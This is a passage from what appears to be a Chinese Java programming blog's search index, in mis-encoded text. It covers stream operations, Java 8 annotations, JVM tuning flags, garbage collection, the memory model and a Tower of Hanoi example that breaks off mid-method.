çš„æµæ’åº sorted(Comparator) ï¼šå°†æµå…ƒç´ æŒ‰Comparatoræ’åº peek(fun) ï¼šæµä¸å˜ï¼Œä½†ä¼šæŠŠæ¯ä¸ªå…ƒç´ ä¼ å…¥funæ‰§è¡Œï¼Œå¯ä»¥ç”¨ä½œè°ƒè¯• æµçš„Terminalæ–¹æ³•(ç»ˆç»“æ“ä½œ)\nï¼ˆ1ï¼‰çº¦ç®€æ“ä½œ\nreduce(fun) ï¼šä»æµä¸­è®¡ç®—æŸä¸ªå€¼ï¼Œæ¥å—ä¸€ä¸ªäºŒå…ƒå‡½æ•°ä½œä¸ºç´¯ç§¯å™¨ï¼Œä»å‰ä¸¤ä¸ªå…ƒç´ å¼€å§‹æŒç»­åº”ç”¨å®ƒï¼Œç´¯ç§¯å™¨çš„ä¸­é—´ç»“æœä½œä¸ºç¬¬ä¸€ä¸ªå‚æ•°ï¼Œæµå…ƒç´ ä½œä¸ºç¬¬äºŒä¸ªå‚æ•° reduce(a, fun) ï¼šaä¸ºå¹ºå…ƒå€¼ï¼Œä½œä¸ºç´¯ç§¯å™¨çš„èµ·ç‚¹ reduce(a, fun1, fun2) ï¼šä¸äºŒå…ƒå˜å½¢ç±»ä¼¼ï¼Œå¹¶å‘æ“ä½œä¸­ï¼Œå½“ç´¯ç§¯å™¨çš„ç¬¬ä¸€ä¸ªå‚æ•°ä¸ç¬¬äºŒä¸ªå‚æ•°éƒ½ä¸ºæµå…ƒç´ ç±»å‹æ—¶ï¼Œå¯ä»¥å¯¹å„ä¸ªä¸­é—´ç»“æœä¹Ÿåº”ç”¨ç´¯ç§¯å™¨è¿›è¡Œåˆå¹¶ï¼Œä½†æ˜¯å½“ç´¯ç§¯å™¨çš„ç¬¬ä¸€ä¸ªå‚æ•°ä¸æ˜¯æµå…ƒç´ ç±»å‹è€Œæ˜¯ç±»å‹Tçš„æ—¶å€™ï¼Œå„ä¸ªä¸­é—´ç»“æœä¹Ÿä¸ºç±»å‹Tï¼Œéœ€è¦fun2æ¥å°†å„ä¸ªä¸­é—´ç»“æœè¿›è¡Œåˆå¹¶ ï¼ˆ2ï¼‰æ”¶é›†æ“ä½œ\niterator()ï¼š forEach(fun)ï¼š forEachOrdered(fun) ï¼šå¯ä»¥åº”ç”¨åœ¨å¹¶è¡Œæµä¸Šä»¥ä¿æŒå…ƒç´ é¡ºåº toArray()ï¼š toArray(T[] :: new) ï¼šè¿”å›æ­£ç¡®çš„å…ƒç´ ç±»å‹ collect(Collector)ï¼š collect(fun1, fun2, fun3) ï¼šfun1è½¬æ¢æµå…ƒç´ ï¼›fun2ä¸ºç´¯ç§¯å™¨ï¼Œå°†fun1çš„è½¬æ¢ç»“æœç´¯ç§¯èµ·æ¥ï¼›fun3ä¸ºç»„åˆå™¨ï¼Œå°†å¹¶è¡Œå¤„ç†è¿‡ç¨‹ä¸­ç´¯ç§¯å™¨çš„å„ä¸ªç»“æœç»„åˆèµ·æ¥ ï¼ˆ3ï¼‰æŸ¥æ‰¾ä¸æ”¶é›†æ“ä½œ\nmax(Comparator)ï¼šè¿”å›æµä¸­æœ€å¤§å€¼ min(Comparator)ï¼šè¿”å›æµä¸­æœ€å°å€¼ count()ï¼šè¿”å›æµä¸­å…ƒç´ ä¸ªæ•° findFirst() ï¼šè¿”å›ç¬¬ä¸€ä¸ªå…ƒç´  findAny() ï¼šè¿”å›ä»»æ„å…ƒç´  anyMatch(Predicate) ï¼šä»»æ„å…ƒç´ åŒ¹é…æ—¶è¿”å›true allMatch(Predicate) ï¼šæ‰€æœ‰å…ƒç´ åŒ¹é…æ—¶è¿”å›true noneMatch(Predicate) ï¼šæ²¡æœ‰å…ƒç´ åŒ¹é…æ—¶è¿”å›true æ³¨è§£ç›¸å…³çš„æ”¹å˜\r#\råœ¨Java 8ä¸­ä½¿ç”¨@Repeatableæ³¨è§£å®šä¹‰é‡å¤æ³¨è§£ã€‚\n// ---æ²¡æœ‰ä½¿ç”¨é‡å¤æ³¨è§£ä¹‹å‰--- public @interface Authority { String role(); } public @interface Authorities { //@Authoritiesæ³¨è§£ä½œä¸ºå¯ä»¥å­˜å‚¨å¤šä¸ª@Authorityæ³¨è§£çš„å®¹å™¨ Authority[] value(); } public class RepeatAnnotationUseOldVersion { @Authorities({@Authority(role=\u0026#34;Admin\u0026#34;), @Authority(role=\u0026#34;Manager\u0026#34;)}) public void doSomeThing(){ } } // ---ä½¿ç”¨é‡å¤æ³¨è§£ä¹‹å--- @Repeatable(Authorities.class) public @interface Authority { String role(); } // @Authoritiesæ³¨è§£ä½œä¸ºå¯ä»¥å­˜å‚¨å¤šä¸ª@Authorityæ³¨è§£çš„å®¹å™¨ public @interface Authorities { Authority[] value(); } public class RepeatAnnotationUseNewVersion { @Authority(role=\u0026#34;Admin\u0026#34;) @Authority(role=\u0026#34;Manager\u0026#34;) public void doSomeThing(){ } } åœ¨ java8 ä»¥å‰ï¼Œæ³¨è§£åªèƒ½ç”¨åœ¨å„ç§ç¨‹åºå…ƒç´ ï¼ˆå®šä¹‰ç±»ã€å®šä¹‰æ¥å£ã€å®šä¹‰æ–¹æ³•ã€å®šä¹‰æˆå‘˜å˜é‡ï¼‰ä¸Šã€‚ä» java8 å¼€å§‹ï¼Œç±»å‹æ³¨è§£å¯ä»¥ç”¨åœ¨ä»»ä½•ä½¿ç”¨åˆ°ç±»å‹çš„åœ°æ–¹ã€‚ æ–°å¢ç±»å‹ï¼š\nTYPE_PARAMETERï¼šè¡¨ç¤ºè¯¥æ³¨è§£èƒ½å†™åœ¨ç±»å‹å‚æ•°çš„å£°æ˜è¯­å¥ä¸­ã€‚ ç±»å‹å‚æ•°å£°æ˜å¦‚ï¼š \u0026lt;T\u0026gt;ã€\u0026lt;T extends Person\u0026gt;ã€‚ TYPE_USEï¼šè¡¨ç¤ºæ³¨è§£å¯ä»¥å†ä»»ä½•ç”¨åˆ°ç±»å‹çš„åœ°æ–¹ä½¿ç”¨ï¼Œæ¯”å¦‚å…è®¸åœ¨å¦‚ä¸‹ä½ç½®ä½¿ç”¨ã€‚ å…¨éƒ¨ç±»å‹\npublic enum ElementType { // ç”¨äºæè¿°ç±»ã€æ¥å£(åŒ…æ‹¬æ³¨è§£ç±»å‹) æˆ–enumå£°æ˜ Class, interface TYPE, // ç”¨äºæè¿°åŸŸ Field declaration FIELD, // ç”¨äºæè¿°æ–¹æ³• Method declaration METHOD, // ç”¨äºæè¿°å‚æ•° Formal parameter declaration PARAMETER, // ç”¨äºæè¿°æ„é€ å™¨ Constructor declaration CONSTRUCTOR, // ç”¨äºæè¿°å±€éƒ¨å˜é‡ Local variable declaration LOCAL_VARIABLE, // æ³¨è§£ Annotation type declaration ANNOTATION_TYPE, // ç”¨äºæè¿°åŒ… Package declaration PACKAGE, // 1.8,ç”¨æ¥æ ‡æ³¨ç±»å‹å‚æ•° Type parameter declaration TYPE_PARAMETER, // 1.8,èƒ½æ ‡æ³¨ä»»ä½•ç±»å‹åç§° Use of a type TYPE_USE } ç®€å•ä½¿ç”¨\n// --TYPE_PARAMETERçš„ä½¿ç”¨--- @Target(ElementType.TYPE_PARAMETER) @Retention(RetentionPolicy.RUNTIME) public @interface TypeParameterAnnotation { } // å¦‚ä¸‹æ˜¯è¯¥æ³¨è§£çš„ä½¿ç”¨ä¾‹å­ public class TypeParameterClass\u0026lt;@TypeParameterAnnotation T\u0026gt; { public \u0026lt;@TypeParameterAnnotation U\u0026gt; T foo(T t) { return null; } } // ---TYPE_USEçš„ä½¿ç”¨--- @Target(ElementType.TYPE_USE) @Retention(RetentionPolicy.RUNTIME) public @interface TypeUseAnnotation { } // å¦‚ä¸‹æ˜¯è¯¥æ³¨è§£çš„ä½¿ç”¨ä¾‹å­ public class TestTypeUse { public static @TypeUseAnnotation class TypeUseClass\u0026lt;@TypeUseAnnotation T\u0026gt; extends @TypeUseAnnotation Object { public void foo(@TypeUseAnnotation T t) throws @TypeUseAnnotation Exception { } } // å¦‚ä¸‹æ³¨è§£çš„ä½¿ç”¨éƒ½æ˜¯åˆæ³•çš„ @SuppressWarnings({ \u0026#34;rawtypes\u0026#34;, \u0026#34;unused\u0026#34;, \u0026#34;resource\u0026#34; }) public static void main(String[] args) throws Exception { TypeUseClass\u0026lt;@TypeUseAnnotation String\u0026gt; typeUseClass = new @TypeUseAnnotation TypeUseClass\u0026lt;\u0026gt;(); typeUseClass.foo(\u0026#34;\u0026#34;); List\u0026lt;@TypeUseAnnotation Comparable\u0026gt; list1 = new ArrayList\u0026lt;\u0026gt;(); List\u0026lt;? extends Comparable\u0026gt; list2 = new ArrayList\u0026lt;@TypeUseAnnotation Comparable\u0026gt;(); @TypeUseAnnotation String text = (@TypeUseAnnotation String)new Object(); java.util. @TypeUseAnnotation Scanner console = new java.util.@TypeUseAnnotation Scanner(System.in); } } "},{"id":73,"href":"/posts/history/jvm%E5%8F%82%E6%95%B0/","title":"Jvmå‚æ•°","section":"æˆ‘çš„åšå®¢","content":"è°ƒä¼˜çš„ç›®çš„\nå‡å°‘Minor GCã€Major GCã€Full GCï¼ˆåœ¨GCçš„è¿‡ç¨‹ä¸­ï¼Œç¨‹åºä¼šSTW[stop the world]ï¼Œç¨‹åºä¼šå‡ºç°å¡é¡¿ï¼Œå‡å°‘GCä¼šæå‡ç¨‹åºçš„è¿è¡Œæµç•…å’Œæ•ˆç‡ï¼‰ã€‚ å…¶ä¸­Full GCæ—¶é—´æœ€é•¿ï¼Œé¦–å…ˆè¦å‡å°‘Full GCã€‚ å¸¸ç”¨çš„è°ƒä¼˜å·¥å…·\nJavaå†…ç½®çš„VisualVM\nJVMå‚æ•°\nå‚æ•° è¯´æ˜ -Xms100M åˆå§‹åŒ–å †ç©ºé—´å¤§å°ï¼Œ-XX:InitialHeapSize=100M -Xmx100M æœ€å¤§å †ç©ºé—´å¤§å°ï¼Œ-XX:MaxHeapSize=100M -Xmn20M å¹´è½»ä»£ç©ºé—´å¤§å°ï¼Œ-XX:NewSize=20M -Xss512k è®¾ç½®çº¿ç¨‹ç©ºé—´å¤§å° -XX:PermGen è®¾ç½®æ°¸ä¹…ä»£å†…å­˜åˆå§‹åŒ–å¤§å°,jdk1.8å¼€å§‹åºŸå¼ƒæ°¸ä¹…ä»£ -XX:MaxPermGen è®¾ç½®æ°¸ä¹…ä»£æœ€å¤§å€¼ -XX:SurvivorRatio è®¾ç½®EdenåŒºå’ŒSurvivoråŒºçš„ç©ºé—´æ¯”ä¾‹:Eden/S0=Eden/S1 é»˜è®¤ä¸º8 -XX:NewRatio è®¾ç½®å¹´è€ä»£å’Œå¹´è½»ä»£çš„å¤§å°æ¯”ä¾‹,é»˜è®¤å€¼æ˜¯2 -XX:PermSize=256m æ°¸ä¹…åŒºç©ºé—´å¤§å° -XX:MaxPermSize=256m æœ€å¤§æ°¸ä¹…åŒºç©ºé—´å¤§å° -XX:+UseStringCache å¯ç”¨ç¼“å­˜å¸¸ç”¨å­—ç¬¦ä¸²,é»˜è®¤å¼€å¯ -XX:+UseConcMarkSweepGC å¹´è€ä»£ä½¿ç”¨cmsæ”¶é›†å™¨ -XX:UseParNewGC æ–°ç”Ÿä»£ä½¿ç”¨å¹¶è¡Œæ”¶é›†å™¨ -XX:ParallelGCThreads=4 å¹¶è¡Œçº¿ç¨‹æ•°é‡ -XX:CMSClassUnloadingEnabled å…è®¸å¯¹ç±»å…ƒç´ è¿›è¡Œæ¸…ç† -XX:+DisableExplicitGC ç¦æ­¢æ˜¾ç¤ºGC -XX:UseCMSInitiatingOccupancyOnly è¡¨ç¤ºåªæœ‰è¾¾åˆ°é˜€å€¼çš„æ—¶å€™ç”¨è¿›è¡Œcmså›æ”¶ -XX:CMSInitiatingOccupancyFraction=70 è®¾ç½®cmsåœ¨è€å¹´ä»£å›æ”¶çš„é˜€å€¼ä¸º70% -verbose:gc è¾“å‡ºè™šæ‹ŸæœºGCè¯¦æƒ… -XX:+PrintGCDetails æ‰“å°GCè¯¦æƒ…æ—¥å¿— -XX:+PrintGCDateStamps æ‰“å°GCè€—æ—¶ -XX:+PrintTenuringDistribution æ‰“å°Tenuringå¹´é¾„ä¿¡æ¯ -XX:+HeapDumpOnOutOfMemoryError å½“æŠ›å‡ºoomé”™è¯¯æ—¶è¿›è¡ŒHeapDump -XX:HeapDumpPath=/home/admin/logs æŒ‡å®šHeapDumpæ–‡ä»¶çš„è¾“å‡ºè·¯å¾„ -XX:+UseSerialGC ä¸²è¡Œ,YoungåŒºå’ŒOldåŒºéƒ½ä½¿ç”¨ä¸²è¡Œ,ä½¿ç”¨å¤åˆ¶ç®—æ³•å›æ”¶,é€»è¾‘ç®€å•é«˜æ•ˆ,æ— çº¿ç¨‹åˆ‡æ¢å¼€é”€ -XX:+UseParallelGC å¹¶è¡Œ, YoungåŒº:ä½¿ç”¨Parallel Scavengeå›æ”¶ç®—æ³•,ä¼šäº§ç”Ÿå¤šä¸ªçº¿ç¨‹å¹¶è¡Œå›æ”¶.é€šè¿‡ -XX:ParallelGCThreads=n å‚æ•°æŒ‡å®šçº¿ç¨‹æ•°,é»˜è®¤æ˜¯cpuæ ¸æ•°;OldåŒº:å•çº¿ç¨‹ -XX:+UseParallelOldGC å¹¶è¡Œ,å’ŒUseParallelGCä¸€æ ·,YoungåŒºå’ŒOldåŒºçš„åƒåœ¾å›æ”¶éƒ½ç”¨å¤šçº¿ç¨‹æ”¶é›† -XX:+UseConcMarkSweepGC å¹¶å‘ã€çŸ­æš‚åœé¡¿çš„å¹¶å‘æ”¶é›†ã€‚youngåŒºï¼šå¯ä»¥ä½¿ç”¨æ™®é€šçš„Parallelåƒåœ¾æ”¶é›†ç®—æ³•ç”±å‚æ•° -XX:+UseParNewGCæ¥æ§åˆ¶;oldåŒº:åªèƒ½ä½¿ç”¨Concurrent Mark Sweep -XX:+UseG1GC å¹¶è¡Œçš„ã€å¹¶å‘çš„å’Œå¢é‡å¼å‹ç¼©çŸ­æš‚åœé¡¿çš„åƒåœ¾æ”¶é›†å™¨ã€‚ä¸åŒºåˆ†YoungåŒºå’ŒOldåŒºç©ºé—´ã€‚å®ƒæŠŠå †ç©ºé—´åˆ’åˆ†ä¸ºå¤šä¸ªå¤§å°ç›¸ç­‰çš„åŒºåŸŸã€‚å½“è¿›è¡Œåƒåœ¾æ”¶é›†æ—¶ï¼Œå®ƒä¼šä¼˜å…ˆæ”¶é›†å­˜æ´»å¯¹è±¡æ¯”è¾ƒå°‘çš„åŒºåŸŸï¼Œå› æ­¤å«\u0026quot;Garbage First\u0026quot; "},{"id":74,"href":"/posts/history/javagc/","title":"Java Gc","section":"æˆ‘çš„åšå®¢","content":"å †çš„å›æ”¶åŒºåŸŸ\næ–°ç”Ÿä»£ï¼ˆYoung Generationï¼‰NewSizeå’ŒMaxNewSizeåˆ†åˆ«å¯ä»¥æ§åˆ¶å¹´è½»ä»£çš„åˆå§‹å¤§å°å’Œæœ€å¤§çš„å¤§å°ã€‚ è€å¹´ä»£ï¼ˆOld Generationï¼‰ã€‚ æ°¸ä¹…ä»£ï¼ˆPermanent Generationï¼‰ã€1.8ä»¥åé‡‡ç”¨å…ƒç©ºé—´ï¼Œä¸åœ¨è™šæ‹Ÿæœºé‡Œï¼Œè€Œæ˜¯ä½¿ç”¨æœ¬åœ°å†…å­˜ã€‘ã€‚ ä¸‰å¤§åƒåœ¾æ”¶é›†ç®—æ³•\næ ‡è®°/æ¸…é™¤ç®—æ³• å¤åˆ¶ç®—æ³• æ ‡è®°/æ•´ç†ç®—æ³• JVM GCç®—æ³•\nJVMé‡‡ç”¨â€œåˆ†ä»£æ”¶é›†ç®—æ³•â€å¯¹ä¸åŒåŒºåŸŸé‡‡ç”¨ä¸åŒçš„å›æ”¶ç®—æ³•ã€‚ æ–°ç”Ÿä»£é‡‡ç”¨å¤åˆ¶ç®—æ³•ã€‚ è€å¹´ä»£é‡‡ç”¨æ ‡è®°/æ¸…é™¤ç®—æ³•æˆ–æ ‡è®°/æ•´ç†ç®—æ³•ã€‚ GCè¿‡ç¨‹\n1-2ã€å½“newæ–°å¯¹è±¡æ—¶ï¼ŒEdenç©ºé—´æ»¡äº†ï¼Œä½¿ç”¨å¤åˆ¶ç®—æ³•æŠŠå­˜æ´»çš„å¯¹è±¡å¤åˆ¶åˆ°ç©ºçš„S0(S1)ä¸Šã€‚ 3-4ã€åˆ¤æ–­S1ä¸­å­˜æ´»å¯¹è±¡çš„å¹´é¾„å€¼ï¼Œå½“å¹´é¾„å€¼+1è¾¾åˆ°15æ—¶ï¼ˆé»˜è®¤15ï¼Œå¯ä¿®æ”¹ï¼‰ï¼Œå¯¹è±¡å°†è¿›å…¥è€å¹´ä»£ï¼Œå½“æ²¡æœ‰æ»¡è¶³æ—¶ï¼Œå°±å¤åˆ¶è¿›å»S0ä¸­ã€‚\nå¤§å¯¹è±¡ç›´æ¥è¿›å…¥è€å¹´ä»£ã€‚ å½“å¯¹è±¡æ€»æ•°å¤§äºSurvivorï¼ˆS0/S1ï¼‰çš„ä¸€åŠæ—¶ï¼Œä¹Ÿä¼šç›´æ¥è¿›å…¥è€å¹´ä»£ã€‚ åˆ¤æ–­å¯¹è±¡æ˜¯å¦å­˜æ´»ç®—æ³• 1.å¼•ç”¨è®¡æ•°ç®—æ³• æ—©æœŸåˆ¤æ–­å¯¹è±¡æ˜¯å¦å­˜æ´»å¤§å¤šéƒ½æ˜¯ä»¥è¿™ç§ç®—æ³•ï¼Œè¿™ç§ç®—æ³•åˆ¤æ–­å¾ˆç®€å•ï¼Œç®€å•æ¥è¯´å°±æ˜¯ç»™å¯¹è±¡æ·»åŠ ä¸€ä¸ªå¼•ç”¨è®¡æ•°å™¨ï¼Œæ¯å½“å¯¹è±¡è¢«å¼•ç”¨ä¸€æ¬¡å°±åŠ 1ï¼Œå¼•ç”¨å¤±æ•ˆæ—¶å°±å‡1ã€‚å½“ä¸º0çš„æ—¶å€™å°±åˆ¤æ–­å¯¹è±¡ä¸ä¼šå†è¢«å¼•ç”¨ã€‚\n2.å¯è¾¾æ€§åˆ†æç®—æ³• å®ƒçš„åŸºæœ¬æ€è·¯æ˜¯é€šè¿‡ä¸€ä¸ªç§°ä¸ºâ€œGC Rootsâ€çš„å¯¹è±¡ï¼ˆå±€éƒ¨å˜é‡ï¼‰ä¸ºèµ·å§‹ç‚¹ï¼Œæœç´¢æ‰€ç»è¿‡çš„è·¯å¾„ç§°ä¸ºå¼•ç”¨é“¾ï¼Œå½“ä¸€ä¸ªå¯¹è±¡åˆ°GC Rootsæ²¡æœ‰ä»»ä½•å¼•ç”¨è·Ÿå®ƒè¿æ¥åˆ™è¯æ˜å¯¹è±¡æ˜¯ä¸å¯ç”¨çš„ã€‚(è§£å†³äº†å¾ªç¯åˆ©ç”¨)\nMinor GCã€Major GCã€Full GC\nåœ¨å¹´è½»ä»£Young space(åŒ…æ‹¬EdenåŒºå’ŒSurvivoråŒº)ä¸­çš„åƒåœ¾å›æ”¶ç§°ä¹‹ä¸º Minor GC,Minor GCåªä¼šæ¸…ç†å¹´è½»ä»£. Major GCæ¸…ç†è€å¹´ä»£ï¼Œä½†æ˜¯é€šå¸¸ä¹Ÿå¯ä»¥æŒ‡å’ŒFull GCæ˜¯ç­‰ä»·ï¼Œå› ä¸ºæ”¶é›†è€å¹´ä»£çš„æ—¶å€™å¾€å¾€ä¹Ÿä¼šä¼´éšç€å‡çº§å¹´è½»ä»£ï¼Œæ”¶é›†æ•´ä¸ªJavaå †ã€‚ Full GCæ˜¯å¯¹æ–°ç”Ÿä»£ã€è€å¹´ä»£ã€æ°¸ä¹…ä»£ç»Ÿä¸€çš„å›æ”¶ã€‚ "},{"id":75,"href":"/posts/history/jvm%E5%86%85%E5%AD%98/","title":"Jvmå†…å­˜","section":"æˆ‘çš„åšå®¢","content":"\rå†…å­˜åŒºåŸŸ\r#\rç¨‹åºè®¡æ•°å™¨\næ¯ä¸ªçº¿ç¨‹éƒ½æœ‰ä¸€ä¸ªç‹¬ç«‹çš„ç¨‹åºè®¡æ•°å™¨ï¼ŒæŒ‡å‘å½“å‰æ‰§è¡Œçš„è¡Œå·ã€‚æ­£åœ¨æ‰§è¡ŒJavaæ–¹æ³•çš„è¯ï¼Œè®¡æ•°å™¨è®°å½•çš„æ˜¯è™šæ‹Ÿæœºå­—èŠ‚ç æŒ‡ä»¤çš„åœ°å€(å½“å‰æŒ‡ä»¤çš„åœ°å€)ã€‚å¦‚æœæ˜¯Naticeæ–¹æ³•ï¼Œåˆ™ä¸ºç©ºã€‚\nJava è™šæ‹Ÿæœºæ ˆ\næ¯ä¸ªæ–¹æ³•åœ¨æ‰§è¡Œçš„æ—¶å€™ä¹Ÿä¼šåˆ›å»ºä¸€ä¸ªæ ˆå¸§ï¼Œå­˜å‚¨äº†å±€éƒ¨å˜é‡ï¼Œæ“ä½œæ•°ï¼ŒåŠ¨æ€é“¾æ¥ï¼Œæ–¹æ³•è¿”å›åœ°å€ã€‚\næ¯ä¸ªæ–¹æ³•ä»è°ƒç”¨åˆ°æ‰§è¡Œå®Œæ¯•ï¼Œå¯¹åº”ä¸€ä¸ªæ ˆå¸§åœ¨è™šæ‹Ÿæœºæ ˆä¸­çš„å…¥æ ˆå’Œå‡ºæ ˆã€‚ å±€éƒ¨å˜é‡æ‰€éœ€å†…å­˜åœ¨ç¼–è¯‘æœŸé—´å®Œæˆåˆ†é…ã€‚ å¦‚æœçº¿ç¨‹è¯·æ±‚çš„æ ˆæ·±åº¦å¤§äºè™šæ‹Ÿæœºæ‰€å…è®¸çš„æ·±åº¦ï¼Œåˆ™StackOverflowErrorã€‚ å¦‚æœè™šæ‹Ÿæœºæ ˆå¯ä»¥åŠ¨æ€æ‰©å±•ï¼Œæ‰©å±•åˆ°æ— æ³•ç”³è¯·è¶³å¤Ÿçš„å†…å­˜ï¼Œåˆ™OutOfMemoryErrorã€‚ æœ¬åœ°æ–¹æ³•æ ˆ\nå’Œè™šæ‹Ÿæœºæ ˆç±»ä¼¼ï¼Œä¸»è¦ä¸ºè™šæ‹Ÿæœºä½¿ç”¨åˆ°çš„Nativeæ–¹æ³•æœåŠ¡ã€‚\nä¹Ÿä¼šæŠ›å‡ºStackOverflowError å’Œ OutOfMemoryErrorã€‚ Javaå †\nè¢«æ‰€æœ‰çº¿ç¨‹å…±äº«çš„ä¸€å—å†…å­˜åŒºåŸŸï¼Œåœ¨è™šæ‹Ÿæœºå¯åŠ¨çš„æ—¶å€™åˆ›å»ºï¼Œç”¨äºå­˜æ”¾å¯¹è±¡å®ä¾‹ã€‚\nå¯¹å¯ä»¥æŒ‰ç…§å¯æ‰©å±•æ¥å®ç°ï¼ˆé€šè¿‡-Xmx å’Œ-Xms æ¥æ§åˆ¶ï¼‰ å½“å †ä¸­æ²¡æœ‰å†…å­˜å¯åˆ†é…ç»™å®ä¾‹ï¼Œä¹Ÿæ— æ³•å†æ‰©å±•æ—¶ï¼Œåˆ™æŠ›å‡ºOutOfMemoryErrorå¼‚å¸¸ã€‚ æ–¹æ³•åŒº\nè¢«æ‰€æœ‰æ–¹æ³•çº¿ç¨‹å…±äº«çš„ä¸€å—å†…å­˜åŒºåŸŸã€‚\nç”¨äºå­˜å‚¨å·²ç»è¢«è™šæ‹ŸæœºåŠ è½½çš„ç±»ä¿¡æ¯ï¼Œå¸¸é‡ï¼Œé™æ€å˜é‡ç­‰ã€‚ è¿™ä¸ªåŒºåŸŸçš„å†…å­˜å›æ”¶ç›®æ ‡ä¸»è¦é’ˆå¯¹å¸¸é‡æ± çš„å›æ”¶å’Œå †ç±»å‹çš„å¸è½½ã€‚ è€ç‰ˆæœ¬æ–¹æ³•åŒºä¹Ÿè¢«ç§°ä¸ºæ°¸ä¹…ä»£ï¼Œjdk8çœŸæ­£å¼€å§‹åºŸå¼ƒæ°¸ä¹…ä»£ï¼Œè€Œä½¿ç”¨å…ƒç©ºé—´(Metaspace)ã€‚ å†…å­˜æ¨¡å‹JMM\r#\rå®šä¹‰ JMMå®šä¹‰äº†çº¿ç¨‹å’Œä¸»å†…å­˜ä¹‹é—´çš„æŠ½è±¡å…³ç³»ã€‚ çº¿ç¨‹ä¹‹é—´çš„å…±äº«å˜é‡å­˜å‚¨åœ¨ä¸»å†…å­˜ï¼ˆMain Memoryï¼‰ä¸­ï¼Œæ¯ä¸ªçº¿ç¨‹éƒ½æœ‰ä¸€ä¸ªç§æœ‰çš„æœ¬åœ°å†…å­˜ï¼ˆLocal Memoryï¼‰ï¼Œæœ¬åœ°å†…å­˜ä¸­å­˜å‚¨äº†è¯¥çº¿ç¨‹è¯»/å†™å…±äº«å˜é‡çš„å‰¯æœ¬ã€‚\nJMMå†…å­˜æ¨¡å‹ä¸‰å¤§ç‰¹æ€§\nåŸå­æ€§ï¼š\nAtomicIntegerç±»ç±»ã€‚ ä½¿ç”¨ synchronized äº’æ–¥é”æ¥ä¿è¯æ“ä½œçš„åŸå­æ€§ã€‚ å¯è§æ€§ï¼š\nsynchronizedï¼Œå¯¹ä¸€ä¸ªå˜é‡æ‰§è¡Œ unlock æ“ä½œä¹‹å‰ï¼Œå¿…é¡»æŠŠå˜é‡å€¼åŒæ­¥å›ä¸»å†…å­˜ã€‚ volatileï¼Œä¼šå¼ºåˆ¶å°†è¯¥å˜é‡è‡ªå·±å’Œå½“æ—¶å…¶ä»–å˜é‡çš„çŠ¶æ€éƒ½åˆ·å‡ºç¼“å­˜ã€‚ finalï¼Œè¢« final å…³é”®å­—ä¿®é¥°çš„å­—æ®µåœ¨æ„é€ å™¨ä¸­ä¸€æ—¦åˆå§‹åŒ–å®Œæˆã€‚ æœ‰åºæ€§ï¼š\næºä»£ç  -\u0026gt; ç¼–è¯‘å™¨ä¼˜åŒ–çš„é‡æ’ -\u0026gt; æŒ‡ä»¤å¹¶è¡Œçš„é‡æ’ -\u0026gt; å†…å­˜ç³»ç»Ÿçš„é‡æ’ -\u0026gt;æœ€ç»ˆæ‰§è¡Œçš„å‘½ä»¤ã€‚ é‡æ’åºè¿‡ç¨‹ä¸ä¼šå½±å“åˆ°å•çº¿ç¨‹ç¨‹åºçš„æ‰§è¡Œï¼Œå´ä¼šå½±å“åˆ°å¤šçº¿ç¨‹å¹¶å‘æ‰§è¡Œçš„æ­£ç¡®æ€§ã€‚ æ“ä½œæŒ‡ä»¤\næŒ‡ä»¤ åç§° æè¿° lock åŠ é” ä½œç”¨äºä¸»å†…å­˜çš„å˜é‡ unlock è§£é” ä½œç”¨äºä¸»å†…å­˜çš„å˜é‡ read è¯»å– è¯»å–ä¸»å†…å­˜çš„å˜é‡ load åŠ è½½ å°†è¯»å–çš„ä¸»å†…å­˜å˜é‡åŠ è½½åˆ°å·¥ä½œå‰¯æœ¬ä¸­ use ä½¿ç”¨ æŠŠå·¥ä½œå†…å­˜ä¸­çš„å˜é‡ä¼ é€’ç»™æ‰§è¡Œå¼•æ“ assign èµ‹å€¼ å°†æ‰§è¡Œå¼•æ“æ¥æ”¶åˆ°çš„å€¼èµ‹å€¼ç»™å·¥ä½œå†…å­˜å˜é‡ store å­˜å‚¨ ä½œç”¨äºå·¥ä½œå†…å­˜ï¼Œå°†å·¥ä½œå†…å­˜å˜é‡ä¼ é€’åˆ°ä¸»å†…å­˜ write å†™å…¥ ä½œç”¨äºä¸»å†…å­˜ï¼Œå°†ä»å·¥ä½œå‰¯æœ¬storeçš„å€¼å†™å…¥ä¸»å†…å­˜ä¸­ "},{"id":76,"href":"/posts/history/%E9%80%92%E5%BD%92%E4%B8%8E%E5%9B%9E%E6%BA%AF%E9%97%AE%E9%A2%98/","title":"é€’å½’ä¸å›æº¯é—®é¢˜","section":"æˆ‘çš„åšå®¢","content":"\ræ±‰è¯ºå¡”é—®é¢˜\r#\rè§£é¢˜æ€è·¯\n1ã€å‡è®¾æœ‰nä¸ªç›˜å­éœ€è¦ç§»åŠ¨ 2ã€é¦–å…ˆå°†æœ€ä¸Šé¢çš„n-1ä¸ªç›˜å­ä»Aå€ŸåŠ©Cç§»åˆ°BæŸ±å­ 3ã€ç„¶åå°†æœ€ä¸‹é¢çš„ä¸€ä¸ªç›˜å­ä»Aç§»åˆ°CæŸ±å­ 4ã€æœ€åå°†Bå½“ä½œAï¼ŒAå½“ä½œBï¼Œå°†n-1ä¸ªç›˜å­ä»Bå€ŸåŠ©Cç§»åŠ¨åˆ°AæŸ±å­ï¼Œå†å°†BæŸ±å­æœ€åä¸€ä¸ªç§»åŠ¨åˆ°Cä¸Šï¼ˆå®é™…é‡å¤äº†2-3æ­¥éª¤ï¼Œåªæ˜¯æŠŠAã€Bå‚è€ƒå¯¹è±¡å¯¹æ¢ï¼‰ 5ã€å½“åªå‰©ä¸‹æœ€åä¸€ä¸ªæ—¶ï¼Œä»Aç§»åŠ¨åˆ°Cå°±å¯ä»¥äº†\nJavaä»£ç \npublic class Hanota { public static void main(String[] args) { List\u0026lt;Integer\u0026gt; a = new ArrayList\u0026lt;\u0026gt;(); List\u0026lt;Integer\u0026gt; b = new ArrayList\u0026lt;\u0026gt;(); List\u0026lt;Integer\u0026gt; c = new ArrayList\u0026lt;\u0026gt;(); a.add(2); a.add(1); a.add(0); new Hanota().hanota(a,b,c); System.out.println(c); } public void hanota(List\u0026lt;Integer\u0026gt; A, List\u0026lt;Integer\u0026gt; B, List\u0026lt;Integer\u0026gt; C) { move(A.size(), A, B, C); } public void move(int n, List\u0026lt;Integer\u0026gt; A, List\u0026lt;Integer\u0026gt; B, List\u0026lt;Integer\u0026gt; C){ if(n == 1){ C.add(A.get(A.size() - 1)); A.remove(A.size() - 1); }else{ // æŠŠAç»è¿‡è¾…åŠ©Cæ”¾åˆ°Bä¸Š move(n - 1, A, C, B); // æŠŠAæ”¾åˆ°Cä¸Š 